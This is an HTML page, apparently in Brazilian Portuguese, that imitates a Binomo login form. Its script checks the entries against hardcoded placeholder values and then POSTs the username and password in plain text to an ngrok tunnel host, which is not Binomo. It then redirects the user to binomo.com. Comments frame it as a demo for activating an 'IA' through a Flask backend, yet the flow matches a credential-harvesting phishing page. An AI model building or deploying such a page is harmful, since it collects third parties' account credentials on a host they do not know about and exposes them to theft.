<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login na Binomo</title>
</head>
<body>

    <h2>Login na Binomo</h2>

    <form id="loginForm">
        <label for="username">Usuário:</label>
        <input type="text" id="username" name="username" required><br><br>
        
        <label for="password">Senha:</label>
        <input type="password" id="password" name="password" required><br><br>
        
        <button type="submit">Login</button>
    </form>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Impede o envio padrão do formulário

            // Coleta os dados de login
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            // Aqui você vai fazer a validação com a Binomo (isso é um exemplo)
            // Mas depois de validado, vamos seguir com o processo de IA.

            // Simulação de login (na prática, você deve integrar com a Binomo)
            const loginValidado = (username === "usuario_correto" && password === "senha_correta");

            if (loginValidado) {
                alert("Login bem-sucedido na Binomo!");
                // Agora você pode fazer a chamada para ativar a IA
                // Fazendo uma requisição para o backend Flask para iniciar a IA
                fetch("https://a849-34-125-225-244.ngrok-free.app/validar_login", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        username: username,
                        password: password
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        // A IA pode ser ativada aqui
                        window.location.href = "https://www.binomo.com"; // Direciona para a Binomo ou outra ação
                    } else {
                        alert("Erro no login. Tente novamente.");
                    }
                })
                .catch(error => {
                    console.error('Erro ao validar o login:', error);
                    alert('Ocorreu um erro. Tente novamente mais tarde.');
                });
            } else {
                alert("Erro no login. Tente novamente.");
            }
        });
    </script>

</body>
</html>
